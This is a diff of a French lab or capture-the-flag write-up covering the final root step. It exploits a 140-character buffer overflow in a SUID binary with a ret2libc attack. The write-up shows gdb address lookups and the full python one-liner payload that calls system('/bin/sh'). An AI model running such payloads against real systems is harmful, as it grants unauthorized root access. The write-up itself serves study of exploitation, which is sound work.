@@ -606,10 +606,30 @@ A ce stade nous avons en faisant ls
 exploit_me 
 mail	
 
+Dernière etape pour passer root.
+
+Une fois de plus nous utilisons ghidra pour analyser le code.
+
+Nous regardons le fichier main.
+
 Nous comprenons que le maximum de caractères est de 140 caractères avec ghidra, puisque nous pouvons voir la déclaration d'ün tableau de 140 caractères destiné à accueillir le paramêtre du main.
 
-Le but étant de passer en root en lui faisant croire que nous sommes root 
-Nous allons utiliser donc une ret2libc attack (Return-to-libc attack)
+//ajouter le morceau de code
+
+Nous constatons qu'il s'agit d'un fichier avec des droits SUID.
+
+En faisant quelques recherches sur le sujet nous trouvons sur wikipedia les informations suivantes :
+
+" 
+	Il s'agit de bits de contrôle d'accès appliqués aux fichiers et répertoires d'un système d'exploitation UNIX. Grâce à eux, un processus exécutant un tel fichier peut s'exécuter au nom d'un autre utilisateur1.
+
+	Quand un fichier exécutable est la propriété de l'utilisateur root, et est rendu setuid, tout processus exécutant ce fichier peut effectuer ses tâches avec les permissions associées à root, ce qui constitue un risque de sécurité pour la machine, s'il existe une faille dans ce programme. En effet, un hacker pourrait utiliser cette faille pour effectuer des opérations réservées à root, par exemple en se créant un compte d'accès illimité en temps et en pouvoirs.
+
+	Notez qu'il est parfaitement possible de rendre un programme setuid d'un compte non-root, ce qui diminue nettement les risques, et l'intérêt de l'opération.
+
+"
+
+Nous allons utiliser la methode ret2libc attack (Return-to-libc attack) pour tenter une escalation de privilèges.
 
 Si nous dépassons ceci avec 
 ./exploit_me $(python -c "print('A' * 145))
@@ -617,12 +637,40 @@ Cela fait segfault le fichier
 
 Une attaque de type return-to-libc est une attaque informatique démarrant généralement par un dépassement de tampon dans lequel l'adresse de retour dans la pile est remplacée par l'adresse d'une autre fonction et une seconde partie de la pile est modifiée pour fournir les paramètres à cette fonction. Ceci permet à un attaquant d'utiliser une fonction existante et d'éviter d'injecter du code malveillant dans le programme.
 
-https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/8
+Pour plus d'informations vous reférer au lien suivant :
+
+https://beta.hackndo.com/retour-a-la-libc/
+
+
+Sur le site en question nous voyons que pour pouvoir mettre l’adresse de retour sur le dessus de la pile, et juste en dessous l’adresse de la chaine de caractère passée en argument à la fonction system(). 
+
+Il faudra donc envoyer au programme un buffer sous cette forme :
+
+[ buffer permettant d'atteindre l'overflow ] [ Adresse system() ] [ Adresse retour ] [ Adresse "/bin/sh" ]
+
+Nous trouvons avec gdb, en utilisant la command "print system", l'adresse systeme : 0xb7e6b060.
+
+Vient alors le tour de la chaine de caractère "/bin/sh". Dans un premier temps, il peut être possible de trouver cette chaine de caractères de manière un peu brutale mais rapide
+
+find __libc_start_main,+99999999,"/bin/sh"
+
+Cette commande effectue une recherche dans une plage mémoire commençant au début de la fonction __libc_start_main() (appelée avant notre fonction main), et d’une taille de 99 999 999 octets
+
+
+Nous avons donc maintenant tous les éléments nécessaire pour pouvoir lancer notre attaque ret2libc, avec un payload comme suit :
+
+[ 140 x "A" ] [ 0xb7e6b060 ] [ OSEF ] [ 0xb7f8cc58 ]
+
+
+
 On met sur la stack a %eip + 8, a l’adresse “/bin/bash”
  
 On remplace avec le code sous python : 
+
 ./exploit_me $(python -c "print('A' * 140 + '\xb7\xe6\xb0\x60'[::-1] + 'AAAA' + '\xb7\xf8\xcc\x58'[::-1])")
 
 
 \xb7\xe6\xb0\x60 : adresse correpondant à ce que nous allons écraser, c'est le registre %eip avec l'adresse système de la libc
 \xb7\xf8\xcc\x58 : adresse correpondant à ce que nous allons mettre sur la pile a l'adresse "/bin/sh"
+
+BIENVENUES CHEZ LES ROOTS
